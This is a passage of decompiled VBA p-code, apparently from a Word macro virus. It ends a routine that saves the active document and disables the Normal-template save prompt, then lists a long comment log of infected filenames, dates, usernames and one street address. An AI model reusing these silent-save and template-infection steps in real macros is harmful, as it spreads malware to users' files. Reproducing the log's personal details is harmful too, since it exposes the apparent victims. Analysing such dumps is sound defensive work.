' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #161:
' 	EndWith 
' Line #162:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #163:
' 	Ld SaveDocument 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #164:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #165:
' 	EndIfBlock 
' Line #166:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #167:
' 	EndIfBlock 
' Line #168:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #169:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #170:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #171:
' 	EndSub 
' Line #172:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #173:
' 	QuoteRem 0x0000 0x0047 " HANJUNG hsintao(OMRF).doc2000.10.31 오전 11:39:57\\SV085\pg082 - NE02:"
' Line #174:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #175:
' 	QuoteRem 0x0000 0x0047 " HANJUNG hsintao(OMRF).doc2000.10.31 오전 11:39:57\\SV085\pg082 - NE02:"
' Line #176:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #177:
' 	QuoteRem 0x0000 0x0047 " HANJUNG hsintao(OMRF).doc2000.10.31 오전 11:39:57\\SV085\pg082 - NE02:"
' Line #178:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #179:
' Line #180:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #181:
' Line #182:
' 	QuoteRem 0x0000 0x000B " flres1.doc"
' Line #183:
' Line #184:
' 	QuoteRem 0x0000 0x000C " sample1.doc"
' Line #185:
' Line #186:
' 	QuoteRem 0x0000 0x001A " Lawton updated resume.doc"
' Line #187:
' Line #188:
' 	QuoteRem 0x0000 0x000D " LEMERISE.DOC"
' Line #189:
' Line #190:
' 	QuoteRem 0x0000 0x000D " galianes.doc"
' Line #191:
' Line #192:
' 	QuoteRem 0x0000 0x0009 " CVUK.doc"
' Line #193:
' Line #194:
' 	QuoteRem 0x0000 0x0011 " word95_BinLi.doc"
' Line #195:
' Line #196:
' 	QuoteRem 0x0000 0x000D " Eduard 1.doc"
' Line #197:
' Line #198:
' 	QuoteRem 0x0000 0x000D " rakowski.doc"
' Line #199:
' Line #200:
' 	QuoteRem 0x0000 0x000C " DHRUVER.DOC"
' Line #201:
' Line #202:
' 	QuoteRem 0x0000 0x0023 " 01:08:39 PM -Wednesday,16 Jun,1999"
' Line #203:
' 	QuoteRem 0x0000 0x0008 " DhruveR"
' Line #204:
' 	QuoteRem 0x0000 0x0000 ""
' Line #205:
' 	QuoteRem 0x0000 0x000C " Dhruver.doc"
' Line #206:
' Line #207:
' 	QuoteRem 0x0000 0x0009 " 6-15.doc"
' Line #208:
' Line #209:
' 	QuoteRem 0x0000 0x0010 " DJI RESTORE.doc"
' Line #210:
' Line #211:
' 	QuoteRem 0x0000 0x0023 " 03:58:39 PM -Wednesday,16 Jun,1999"
' Line #212:
' 	QuoteRem 0x0000 0x000C " Tom Dziubek"
' Line #213:
' 	QuoteRem 0x0000 0x0000 ""
' Line #214:
' 	QuoteRem 0x0000 0x0010 " DJI RESTORE.doc"
' Line #215:
' Line #216:
' 	QuoteRem 0x0000 0x000F " FEC Script.doc"
' Line #217:
' Line #218:
' 	QuoteRem 0x0000 0x0015 " OutlookDelegates.doc"
' Line #219:
' Line #220:
' 	QuoteRem 0x0000 0x0009 " nite.doc"
' Line #221:
' Line #222:
' 	QuoteRem 0x0000 0x000D " sbranc01.doc"
' Line #223:
' Line #224:
' 	QuoteRem 0x0000 0x0015 " newuser-djxpress.doc"
' Line #225:
' Line #226:
' 	QuoteRem 0x0000 0x000C " june_99.doc"
' Line #227:
' Line #228:
' 	QuoteRem 0x0000 0x0020 " 02:01:37 PM -Monday,28 Jun,1999"
' Line #229:
' 	QuoteRem 0x0000 0x0007 " TozziT"
' Line #230:
' 	QuoteRem 0x0000 0x0000 ""
' Line #231:
' 	QuoteRem 0x0000 0x000C " june_99.doc"
' Line #232:
' Line #233:
' 	QuoteRem 0x0000 0x000D " teammov1.doc"
' Line #234:
' Line #235:
' 	QuoteRem 0x0000 0x0022 " 03:34:41 PM -Wednesday,7 Jul,1999"
' Line #236:
' 	QuoteRem 0x0000 0x0009 " DziubekT"
' Line #237:
' 	QuoteRem 0x0000 0x0000 ""
' Line #238:
' 	QuoteRem 0x0000 0x000E " teammov11.doc"
' Line #239:
' Line #240:
' 	QuoteRem 0x0000 0x000A " Document2"
' Line #241:
' Line #242:
' 	QuoteRem 0x0000 0x000C " oneweek.doc"
' Line #243:
' Line #244:
' 	QuoteRem 0x0000 0x000C " oneweek.doc"
' Line #245:
' Line #246:
' 	QuoteRem 0x0000 0x000A " Document1"
' Line #247:
' Line #248:
' 	QuoteRem 0x0000 0x000C " twoweek.doc"
' Line #249:
' Line #250:
' 	QuoteRem 0x0000 0x000A " 4week.doc"
' Line #251:
' Line #252:
' 	QuoteRem 0x0000 0x0022 " 01:44:35 PM -Wednesday,7 Jul,1999"
' Line #253:
' 	QuoteRem 0x0000 0x000E " Ernesto Dulce"
' Line #254:
' 	QuoteRem 0x0000 0x0000 ""
' Line #255:
' 	QuoteRem 0x0000 0x000A " 4week.doc"
' Line #256:
' Line #257:
' 	QuoteRem 0x0000 0x000A " FSDLA.doc"
' Line #258:
' Line #259:
' 	QuoteRem 0x0000 0x000A " FSDLA.doc"
' Line #260:
' Line #261:
' 	QuoteRem 0x0000 0x001D " July 13th Outage Request.doc"
' Line #262:
' Line #263:
' 	QuoteRem 0x0000 0x0020 " 12:14:22 PM -Monday,12 Jul,1999"
' Line #264:
' 	QuoteRem 0x0000 0x0007 " cnsncc"
' Line #265:
' 	QuoteRem 0x0000 0x0000 ""
' Line #266:
' 	QuoteRem 0x0000 0x001D " July 13th Outage Request.doc"
' Line #267:
' Line #268:
' 	QuoteRem 0x0000 0x0014 " Kathy's Resume1.doc"
' Line #269:
' Line #270:
' 	QuoteRem 0x0000 0x000C " ubeedoo.doc"
' Line #271:
' Line #272:
' 	QuoteRem 0x0000 0x0021 " Unregistered Network Numbers.doc"
' Line #273:
' Line #274:
' 	QuoteRem 0x0000 0x0010 " servernames.doc"
' Line #275:
' Line #276:
' 	QuoteRem 0x0000 0x0014 " data circuits 1.doc"
' Line #277:
' Line #278:
' 	QuoteRem 0x0000 0x001A " DAILY ACTIVITY REPORT.doc"
' Line #279:
' Line #280:
' 	QuoteRem 0x0000 0x0021 " 09:51:17 AM -Tuesday,13 Jul,1999"
' Line #281:
' 	QuoteRem 0x0000 0x0012 " Susie Scornavacca"
' Line #282:
' 	QuoteRem 0x0000 0x0000 ""
' Line #283:
' 	QuoteRem 0x0000 0x001A " DAILY ACTIVITY REPORT.doc"
' Line #284:
' Line #285:
' 	QuoteRem 0x0000 0x0009 " june.doc"
' Line #286:
' Line #287:
' 	QuoteRem 0x0000 0x0010 " OSDJune1999.doc"
' Line #288:
' Line #289:
' 	QuoteRem 0x0000 0x001A " djxprss Request Form1.doc"
' Line #290:
' Line #291:
' 	QuoteRem 0x0000 0x000E " Shadow R4.doc"
' Line #292:
' Line #293:
' 	QuoteRem 0x0000 0x000D " TOKREPLL.doc"
' Line #294:
' Line #295:
' 	QuoteRem 0x0000 0x000B " bypass.doc"
' Line #296:
' Line #297:
' 	QuoteRem 0x0000 0x0021 " 12:20:36 PM -Tuesday,13 Jul,1999"
' Line #298:
' 	QuoteRem 0x0000 0x000B " Bob Brooks"
' Line #299:
' 	QuoteRem 0x0000 0x0000 ""
' Line #300:
' 	QuoteRem 0x0000 0x000B " bypass.doc"
' Line #301:
' Line #302:
' 	QuoteRem 0x0000 0x0009 " WORD.doc"
' Line #303:
' Line #304:
' 	QuoteRem 0x0000 0x0012 " UPDSecIDaud21.doc"
' Line #305:
' Line #306:
' 	QuoteRem 0x0000 0x0012 " UPDSecIDaud21.doc"
' Line #307:
' Line #308:
' 	QuoteRem 0x0000 0x0020 " 09:14:25 AM -Friday,16 Jul,1999"
' Line #309:
' 	QuoteRem 0x0000 0x000F " Deb Sorchinski"
' Line #310:
' 	QuoteRem 0x0000 0x0012 " 20 Academy Street"
' Line #311:
' 	QuoteRem 0x0000 0x0015 " Princeton, NJ  98540"
' Line #312:
' 	QuoteRem 0x0000 0x0011 " UPDSecIDaud2.doc"
' Line #313:
' Line #314:
' 	QuoteRem 0x0000 0x000D " editor~2.doc"
' Line #315:
' Line #316:
' 	QuoteRem 0x0000 0x0027 " CEO Expectations & Decision Making.doc"
' Line #317:
' Line #318:
' 	QuoteRem 0x0000 0x000E " HR Issues.doc"
' Line #319:
' Line #320:
' 	QuoteRem 0x0000 0x000C " WINWORD.DOC"
' Line #321:
' Line #322:
' 	QuoteRem 0x0000 0x0019 " dorrisobrien_bio.doc.doc"
' Line #323:
' Line #324:
' 	QuoteRem 0x0000 0x0016 " MelConnet_bio.doc.DOC"
' Line #325:
' Line #326:
' 	QuoteRem 0x0000 0x0020 " Aeneid Position Spec 7-2-99.doc"
' Line #327:
' Line #328:
' 	QuoteRem 0x0000 0x000D " orgchart.doc"
' Line #329:
' Line #330:
' 	QuoteRem 0x0000 0x0018 " top level org chart.doc"
' Line #331:
' Line #332:
' 	QuoteRem 0x0000 0x000F " first note.doc"
' Line #333:
' Line #334:
' 	QuoteRem 0x0000 0x0018 " top level org chart.doc"
' Line #335:
' Line #336:
' 	QuoteRem 0x0000 0x0021 " Sunesis Group Communications.doc"
' Line #337:
' Line #338:
' 	QuoteRem 0x0000 0x000F " first note.doc"
' Line #339:
' Line #340:
' 	QuoteRem 0x0000 0x0018 " CONTACT LIST DIRECT.doc"
' Line #341:
' Line #342:
' 	QuoteRem 0x0000 0x000D " GSReview.doc"
' Line #343:
' Line #344:
' 	QuoteRem 0x0000 0x0025 " WEEKLY STAFF MEETING-TIM ANDREWS.doc"
' Line #345:
' Line #346:
' 	QuoteRem 0x0000 0x000D " Polycom1.doc"
' Line #347:
' Line #348:
' 	QuoteRem 0x0000 0x0016 " PENDING JV ITEMS_.doc"
' Line #349:
' Line #350:
' 	QuoteRem 0x0000 0x0018 " WAVO MEETING AGENDA.doc"
' Line #351:
' Line #352:
' 	QuoteRem 0x0000 0x0020 " 03:08:21 AM -Friday,23 Jul,1999"
' Line #353:
' 	QuoteRem 0x0000 0x0013 " Dow Jones Employee"
' Line #354:
' 	QuoteRem 0x0000 0x0000 ""
' Line #355:
' 	QuoteRem 0x0000 0x0018 " WAVO MEETING AGENDA.doc"
' Line #356:
' Line #357:
' 	QuoteRem 0x0000 0x0006 " bruce"
' Line #358:
' Line #359:
' 	QuoteRem 0x0000 0x0007 " Bruce2"
' Line #360:
' Line #361:
' 	QuoteRem 0x0000 0x0007 " bruce3"
' Line #362:
' Line #363:
' 	QuoteRem 0x0000 0x000A " email.doc"
' Line #364:
' Line #365:
' 	QuoteRem 0x0000 0x002E " Revised Activities By Role - Working Team.doc"
' Line #366:
' Line #367:
' 	QuoteRem 0x0000 0x0027 " DJICustomerLetter_American English.DOC"
' Line #368:
' Line #369:
' 	QuoteRem 0x0000 0x000B " ppteam.doc"
' Line #370:
' Line #371:
' 	QuoteRem 0x0000 0x0021 " 12:23:02 PM -Tuesday,27 Jul,1999"
' Line #372:
' 	QuoteRem 0x0000 0x000B " DJIPI - HK"
' Line #373:
' 	QuoteRem 0x0000 0x0000 ""
' Line #374:
' 	QuoteRem 0x0000 0x000B " ppteam.doc"
' Line #375:
' Line #376:
' 	QuoteRem 0x0000 0x0016 " quotation for eve.doc"
' Line #377:
' Line #378:
' 	QuoteRem 0x0000 0x003E " Great Note from Tim Andrews (Customer Focus & Leadership).doc"
' Line #379:
' Line #380:
' 	QuoteRem 0x0000 0x0027 " Tim Andrews Note - 3rd month of JV.doc"
' Line #381:
' Line #382:
' 	QuoteRem 0x0000 0x0029 " DJRBI Top Level Organizational Chart.doc"
' Line #383:
' Line #384:
' 	QuoteRem 0x0000 0x0018 " top level org chart.doc"
' Line #385:
' Line #386:
' 	QuoteRem 0x0000 0x0019 " Chinatrust Agreement.doc"
' Line #387:
' Line #388:
' 	QuoteRem 0x0000 0x0011 " RBB Proposal.doc"
' Line #389:
' Line #390:
' 	QuoteRem 0x0000 0x001D " Sources Available on RBB.doc"
' Line #391:
' Line #392:
' 	QuoteRem 0x0000 0x0046 " Hospital Authority - successful experience & DJ Technical Contact.doc"
' Line #393:
' Line #394:
' 	QuoteRem 0x0000 0x000C " WINWORD.DOC"
' Line #395:
' Line #396:
' 	QuoteRem 0x0000 0x0020 " RBB Trial Evaluation Letter.doc"
' Line #397:
' Line #398:
' 	QuoteRem 0x0000 0x0022 " 08:49:41 AM -Thursday,29 Jul,1999"
' Line #399:
' 	QuoteRem 0x0000 0x000C " Warren Tang"
' Line #400:
' 	QuoteRem 0x0000 0x0000 ""
' Line #401:
' 	QuoteRem 0x0000 0x0020 " RBB Trial Evaluation Letter.doc"
' Line #402:
' Line #403:
' 	QuoteRem 0x0000 0x0016 " TAcontentexchange.doc"
' Line #404:
' Line #405:
' 	QuoteRem 0x0000 0x0016 " DJI English Intro.doc"
' Line #406:
' Line #407:
' 	QuoteRem 0x0000 0x000E " RBB intro.doc"
' Line #408:
' Line #409:
' 	QuoteRem 0x0000 0x000C " Reuters.doc"
' Line #410:
' Line #411:
' 	QuoteRem 0x0000 0x000B " Orient.doc"
' Line #412:
' Line #413:
' 	QuoteRem 0x0000 0x000C " WINWORD.DOC"
' Line #414:
' Line #415:
' 	QuoteRem 0x0000 0x000B " Inform.doc"
' Line #416:
' Line #417:
' 	QuoteRem 0x0000 0x000B " Inform.doc"
' Line #418:
' Line #419:
' 	QuoteRem 0x0000 0x0022 " 11:02:38 �鷗� -Monday,16 Aug,1999"
' Line #420:
' 	QuoteRem 0x0000 0x000E " Administrator"
' Line #421:
' 	QuoteRem 0x0000 0x0000 ""
' Line #422:
' 	QuoteRem 0x0000 0x0007 " PW.doc"
' Line #423:
' Line #424:
' 	QuoteRem 0x0000 0x000C " Siemens.doc"
' Line #425:
' Line #426:
' 	QuoteRem 0x0000 0x0013 " Enron China PW.doc"
' Line #427:
' Line #428:
' 	QuoteRem 0x0000 0x000A " Document2"
' Line #429:
' Line #430:
' 	QuoteRem 0x0000 0x000E " Dow Jones.doc"
' Line #431:
' Line #432:
' 	QuoteRem 0x0000 0x0021 " Change to the contractLegend.doc"
' Line #433:
' Line #434:
' 	QuoteRem 0x0000 0x001E " Legend.docfilename=Legend.doc"
' Line #435:
' Line #436:
' 	QuoteRem 0x0000 0x0013 " RBB SelectCCTV.doc"
' Line #437:
' Line #438:
' 	QuoteRem 0x0000 0x0014 " RBB SelectCCTV2.doc"
' Line #439:
' Line #440:
' 	QuoteRem 0x0000 0x0020 " 05:19:20 PM -Friday,20 Aug,1999"
' Line #441:
' 	QuoteRem 0x0000 0x0005 " ws12"
' Line #442:
' 	QuoteRem 0x0000 0x0000 ""
' Line #443:
' 	QuoteRem 0x0000 0x0013 " RBB_SelectCCTV.doc"
' Line #444:
' Line #445:
' 	QuoteRem 0x0000 0x0023 " 忌눈뵨쒔檀롸잼，객몹菱방쪼頓鱗.doc"
' Line #446:
' Line #447:
' 	QuoteRem 0x0000 0x000D " 0823XMFX.doc"
' Line #448:
' Line #449:
' 	QuoteRem 0x0000 0x000C " 0823XXT.doc"
' Line #450:
' Line #451:
' 	QuoteRem 0x0000 0x001F " 쒔셌꼬몹으커벌헤쌘커꿉뺍蝎.doc"
' Line #452:
' Line #453:
' 	QuoteRem 0x0000 0x0019 " 斤口꿉뺍莉훙逃묏栗깊.doc"
' Line #454:
' Line #455:
' 	QuoteRem 0x0000 0x001D " 斤口꿉뺍莉훙逃섟묏鱗斂콘.doc"
' Line #456:
' Line #457:
' 	QuoteRem 0x0000 0x0019 " 斤口꿉뺍莉훙逃묏栗깊.doc"
' Line #458:
' Line #459:
' 	QuoteRem 0x0000 0x000C " 1練  琯.doc"
' Line #460:
' Line #461:
' 	QuoteRem 0x0000 0x0025 " 밑黨“箇옰세苟券”쌘커돨접淃괩멩.doc"
' Line #462:
' Line #463:
' 	QuoteRem 0x0000 0x0029 " “櫓빽륩干匡뺏嵐듯”쌘커쉥瞳랗敬꺄놔.doc"
' Line #464:
' Line #465:
' 	QuoteRem 0x0000 0x000F " 멕黛漑0824.doc"
' Line #466:
' Line #467:
' 	QuoteRem 0x0000 0x000B " 燔�國�.doc"
' Line #468:
' Line #469:
' 	QuoteRem 0x0000 0x0015 " 쒔셌꼬쌘커괩꺄깊.doc"
' Line #470:
' Line #471:
' 	QuoteRem 0x0000 0x000D " 0825XMFX.doc"
' Line #472:
' Line #473:
' 	QuoteRem 0x0000 0x000D " 0826SMFX.doc"
' Line #474:
' Line #475:
' 	QuoteRem 0x0000 0x0011 " 꽝옘朞痙0826.doc"
' Line #476:
' Line #477:
' 	QuoteRem 0x0000 0x0017 " 棍젬쒔롤賈痰구戈쩌.doc"
' Line #478:
' Line #479:
' 	QuoteRem 0x0000 0x000D " 숌    괩.doc"
' Line #480:
' Line #481:
' 	QuoteRem 0x0000 0x000D " 숌괩0325.doc"
' Line #482:
' Line #483:
' 	QuoteRem 0x0000 0x001E " 櫓卵랗敬쒔셌꼬쌘커괩꺄데1.doc"
' Line #484:
' Line #485:
' 	QuoteRem 0x0000 0x0013 " 쌘커긴땡繫列23.doc"
' Line #486:
' Line #487:
' 	QuoteRem 0x0000 0x000D " 0828XMFX.doc"
' Line #488:
' Line #489:
' 	QuoteRem 0x0000 0x000E " 990829－2.xls"
' Line #490:
' Line #491:
' 	QuoteRem 0x0000 0x0016 " 806淚소꿉뺍삔朞痙.doc"
' Line #492:
' Line #493:
' 	QuoteRem 0x0000 0x000E " 990829－3.xls"
' Line #494:
' Line #495:
' 	QuoteRem 0x0000 0x000E " 990829－1.xls"
' Line #496:
' Line #497:
' 	QuoteRem 0x0000 0x000C " BTD0828.doc"
' Line #498:
' Line #499:
' 	QuoteRem 0x0000 0x000D " RCXX0829.doc"
' Line #500:
' Line #501:
' 	QuoteRem 0x0000 0x0011 " 꽝옘朞痙0830.doc"
' Line #502:
' Line #503:
' 	QuoteRem 0x0000 0x000D " 0829SMFX.doc"
' Line #504:
' Line #505:
' 	QuoteRem 0x0000 0x000D " 0830SMFX.doc"
' Line #506:
' Line #507:
' 	QuoteRem 0x0000 0x000C " 0830SXT.doc"
' Line #508:
' Line #509:
' 	QuoteRem 0x0000 0x000E " 990829－1.xls"
' Line #510:
' Line #511:
' 	QuoteRem 0x0000 0x0006 " 匡도3"
' Line #512:
' Line #513:
' 	QuoteRem 0x0000 0x000E " 990829－3.xls"
' Line #514:
' Line #515:
' 	QuoteRem 0x0000 0x000F " 쏜皐뒈0829.doc"
' Line #516:
' Line #517:
' 	QuoteRem 0x0000 0x000D " �荇�0829.doc"
' Line #518:
' Line #519:
' 	QuoteRem 0x0000 0x0006 " 匡도2"
' Line #520:
' Line #521:
' 	QuoteRem 0x0000 0x000D " 0829XXT1.doc"
' Line #522:
' Line #523:
' 	QuoteRem 0x0000 0x000C " BTD0830.doc"
' Line #524:
' Line #525:
' 	QuoteRem 0x0000 0x0022 " 05:40:49 PM -Wednesday,1 Sep,1999"
' Line #526:
' 	QuoteRem 0x0000 0x0006 " mac03"
' Line #527:
' 	QuoteRem 0x0000 0x0000 ""
' Line #528:
' 	QuoteRem 0x0000 0x000C " BTD0901.doc"
' Line #529:
' Line #530:
' 	QuoteRem 0x0000 0x000C " 0902SXT.doc"
' Line #531:
' Line #532:
' 	QuoteRem 0x0000 0x000D " 꼬쥴돔：.doc"
' Line #533:
' Line #534:
' 	QuoteRem 0x0000 0x0011 " 긍품꽝옘902A.doc"
' Line #535:
' Line #536:
' 	QuoteRem 0x0000 0x0006 " 1.doc"
' Line #537:
' Line #538:
' 	QuoteRem 0x0000 0x000C " 0901SXT.doc"
' Line #539:
' Line #540:
' 	QuoteRem 0x0000 0x000C " 0901XXT.doc"
' Line #541:
' Line #542:
' 	QuoteRem 0x0000 0x000A " 0902A.doc"
' Line #543:
' Line #544:
' 	QuoteRem 0x0000 0x000E " 990902－1.xls"
' Line #545:
' Line #546:
' 	QuoteRem 0x0000 0x000E " 990902－2.xls"
' Line #547:
' Line #548:
' 	QuoteRem 0x0000 0x000E " 990902－3.xls"
' Line #549:
' Line #550:
' 	QuoteRem 0x0000 0x000F " 쏜皐뒈0902.doc"
' Line #551:
' Line #552:
' 	QuoteRem 0x0000 0x000D " �荇�0902.doc"
' Line #553:
' Line #554:
' 	QuoteRem 0x0000 0x0009 " 0902.doc"
' Line #555:
' Line #556:
' 	QuoteRem 0x0000 0x000C " 0902XXT.doc"
' Line #557:
' Line #558:
' 	QuoteRem 0x0000 0x000D " 0902XMFX.doc"
' Line #559:
' Line #560:
' 	QuoteRem 0x0000 0x000C " jky0902.doc"
' Line #561:
' Line #562:
' 	QuoteRem 0x0000 0x001E " 《櫓벌꼿쒔괩돛》괩痙데831.doc"
' Line #563:
' Line #564:
' 	QuoteRem 0x0000 0x000D " �荇�0901.doc"
' Line #565:
' Line #566:
' 	QuoteRem 0x0000 0x001D " 첵竟뚤淚撚무밑륩蛟돨矜헹.doc"
' Line #567:
' Line #568:
' 	QuoteRem 0x0000 0x0029 " 貢쭹櫓劤壙喇쬠돨景듐섟페唐槻왠齡놓決.doc"
' Line #569:
' Line #570:
' 	QuoteRem 0x0000 0x0023 " 櫓벌훙췽댕欺劤壙溝첵썽淚소죗깊.doc"
' Line #571:
' Line #572:
' 	QuoteRem 0x0000 0x000F " 멕黛漑0615.doc"
' Line #573:
' Line #574:
' 	QuoteRem 0x0000 0x0008 " 斤1.doc"
' Line #575:
' Line #576:
' 	QuoteRem 0x0000 0x000F " 멕黛漑0805.doc"
' Line #577:
' Line #578:
' 	QuoteRem 0x0000 0x000D " RCXX0527.doc"
' Line #579:
' Line #580:
' 	QuoteRem 0x0000 0x000D " RCXX0609.doc"
' Line #581:
' Line #582:
' 	QuoteRem 0x0000 0x000C " 0904XXT.doc"
' Line #583:
' Line #584:
' 	QuoteRem 0x0000 0x000F " 쏜皐뒈0901.doc"
' Line #585:
' Line #586:
' 	QuoteRem 0x0000 0x000F " 쏜皐뒈0904.doc"
' Line #587:
' Line #588:
' 	QuoteRem 0x0000 0x000D " �荇�0904.doc"
' Line #589:
' Line #590:
' 	QuoteRem 0x0000 0x000D " 0904XMFX.doc"
' Line #591:
' Line #592:
' 	QuoteRem 0x0000 0x000C " 0905SXT.doc"
' Line #593:
' Line #594:
' 	QuoteRem 0x0000 0x0022 " 08:23:59 AM -Saturday,11 Sep,1999"
' Line #595:
' 	QuoteRem 0x0000 0x0005 " ws12"
' Line #596:
' 	QuoteRem 0x0000 0x0000 ""
' Line #597:
' 	QuoteRem 0x0000 0x000C " 0909SXT.doc"
' Line #598:
' Line #599:
' 	QuoteRem 0x0000 0x0035 " 櫓卵든柬憩쒔셌꼬밑黨“든柬憩功삔쌘커딧꿴”돨삠괩.doc"
' Line #600:
' Line #601:
' 	QuoteRem 0x0000 0x002B " ’99《꼿말》홍헷쬠見·�瞿Ｄ猿蘇邈薺㉤�.doc"
' Line #602:
' Line #603:
' 	QuoteRem 0x0000 0x0007 " 攻.doc"
' Line #604:
' Line #605:
' 	QuoteRem 0x0000 0x000D " 其엊럇陋.doc"
' Line #606:
' Line #607:
' 	QuoteRem 0x0000 0x0008 " 913.doc"
' Line #608:
' Line #609:
' 	QuoteRem 0x0000 0x000C " jkm0913.doc"
' Line #610:
' Line #611:
' 	QuoteRem 0x0000 0x0017 " 齡튬훙삔累쒔롤渡炬.doc"
' Line #612:
' Line #613:
' 	QuoteRem 0x0000 0x0019 " ~$랑무鱇悧꼴련빽꿉뺍.doc"
' Line #614:
' Line #615:
' 	QuoteRem 0x0000 0x0008 " 917.doc"
' Line #616:
' Line #617:
' 	QuoteRem 0x0000 0x001B " 긍서莉묏鱗직넋맣쏵렘갭.doc"
' Line #618:
' Line #619:
' 	QuoteRem 0x0000 0x0008 " 917.doc"
' Line #620:
' Line #621:
' 	QuoteRem 0x0000 0x0008 " 917.doc"
' Line #622:
' Line #623:
' 	QuoteRem 0x0000 0x0008 " 917.doc"
' Line #624:
' Line #625:
' 	QuoteRem 0x0000 0x0008 " 917.doc"
' Line #626:
' Line #627:
' 	QuoteRem 0x0000 0x0008 " 917.doc"
' Line #628:
' Line #629:
' 	QuoteRem 0x0000 0x0008 " 917.doc"
' Line #630:
' Line #631:
' 	QuoteRem 0x0000 0x0008 " 917.doc"
' Line #632:
' Line #633:
' 	QuoteRem 0x0000 0x000C " jky0917.doc"
' Line #634:
' Line #635:
' 	QuoteRem 0x0000 0x000C " jkr0917.doc"
' Line #636:
' Line #637:
' 	QuoteRem 0x0000 0x000C " jkm0917.doc"
' Line #638:
' Line #639:
' 	QuoteRem 0x0000 0x000C " jkf0917.doc"
' Line #640:
' Line #641:
' 	QuoteRem 0x0000 0x0016 " 셕炬샙各썹   벌셥.doc"
' Line #642:
' Line #643:
' 	QuoteRem 0x0000 0x0011 " 훙慤뇹쥴돔：.doc"
' Line #644:
' Line #645:
' 	QuoteRem 0x0000 0x0006 " 匡도3"
' Line #646:
' Line #647:
' 	QuoteRem 0x0000 0x000C " BTD9018.doc"
' Line #648:
' Line #649:
' 	QuoteRem 0x0000 0x0019 " Internet무鱇옘뀁숌션.doc"
' Line #650:
' Line #651:
' 	QuoteRem 0x0000 0x0008 " 918.doc"
' Line #652:
' Line #653:
' 	QuoteRem 0x0000 0x000D " 990918-1.xls"
' Line #654:
' Line #655:
' 	QuoteRem 0x0000 0x000D " 990918-3.xls"
' Line #656:
' Line #657:
' 	QuoteRem 0x0000 0x0006 " 匡도2"
' Line #658:
' Line #659:
' 	QuoteRem 0x0000 0x0027 " 베袞벌소깊刻쉥셨崎獵契掘끓괏송漣꿉.doc"
' Line #660:
' Line #661:
' 	QuoteRem 0x0000 0x0018 " 寧鷺路듐朞痙꽝옘920.doc"
' Line #662:
' Line #663:
' 	QuoteRem 0x0000 0x000C " jky0916.doc"
' Line #664:
' Line #665:
' 	QuoteRem 0x0000 0x000C " jky0914.doc"
' Line #666:
' Line #667:
' 	QuoteRem 0x0000 0x002D " 亶景랑무鱇悧꼴굔흩景꺽却련빽괩돛꿉뺍렘갭.doc"
' Line #668:
' Line #669:
' 	QuoteRem 0x0000 0x000A " 920-1.doc"
' Line #670:
' Line #671:
' 	QuoteRem 0x0000 0x0006 " 匡도2"
' Line #672:
' Line #673:
' 	QuoteRem 0x0000 0x0008 " 919.doc"
' Line #674:
' Line #675:
' 	QuoteRem 0x0000 0x001B " Backup of 10墩路듐朞痙.wbk"
' Line #676:
' Line #677:
' 	QuoteRem 0x0000 0x001E " 쒔셌꼬9墩룀齡튬훙삔累션쩌.doc"
' Line #678:
' Line #679:
' 	QuoteRem 0x0000 0x0025 " 밑黨《�荇障렝맣옇캅椽셋렌韶庸픈�.doc"
' Line #680:
' Line #681:
' 	QuoteRem 0x0000 0x0017 " 줄珂훙逃익蛟랙렴깊.doc"
' Line #682:
' Line #683:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #684:
' Line #685:
' 	QuoteRem 0x0000 0x0006 " 匡도2"
' Line #686:
' Line #687:
' 	QuoteRem 0x0000 0x001D " 《몸鬼鬼벌唐폐撚돨믐慤》.doc"
' Line #688:
' Line #689:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #690:
' Line #691:
' 	QuoteRem 0x0000 0x0027 " 亶벌든柬劤壙：몸昑뺏，寮꺄섟劤관陋.doc"
' Line #692:
' Line #693:
' 	QuoteRem 0x0000 0x0031 " 닒든柬쌘커관陋近駕긴뺏였든柬첵썽돨몸昑뺏瀏헹.doc"
' Line #694:
' Line #695:
' 	QuoteRem 0x0000 0x0019 " 쒔셌틉돛돨近蹶섟忌눈.doc"
' Line #696:
' Line #697:
' 	QuoteRem 0x0000 0x0029 " 쬠틔탬濫쫠瞳틉돛쒔檀櫓돨路狼鱗痰0625.doc"
' Line #698:
' Line #699:
' 	QuoteRem 0x0000 0x000D " 9027smfx.doc"
' Line #700:
' Line #701:
' 	QuoteRem 0x0000 0x0021 " 밑黨鹿쳄벌槨看돨굇獨볜횔뷰珞.doc"
' Line #702:
' Line #703:
' 	QuoteRem 0x0000 0x001D " 枷寧퍅쇌쒔셌꼬쌘커꺄놔데.doc"
' Line #704:
' Line #705:
' 	QuoteRem 0x0000 0x0017 " 枷寧퍅쇌쌘커꺄놔데.doc"
' Line #706:
' Line #707:
' 	QuoteRem 0x0000 0x000D " 0927XMFX.doc"
' Line #708:
' Line #709:
